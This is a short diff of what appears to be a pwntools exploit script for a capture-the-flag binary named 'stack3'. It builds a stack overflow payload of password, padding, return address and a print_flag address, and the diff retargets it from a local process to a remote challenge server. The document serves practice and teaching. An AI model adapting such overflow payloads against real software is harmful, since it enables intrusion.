@@ -9,7 +9,7 @@ padding = b'A' * (offset - len(password))
 payload = password + padding + ret + print_flag_addr
 
 
-# p = remote("127.0.0.1", 20004)
-p = process("./stack3")
+p = remote("rev.danissimurr.ru", 1343)
+# p = process("./stack3")
 p.sendline(payload)
 p.interactive()
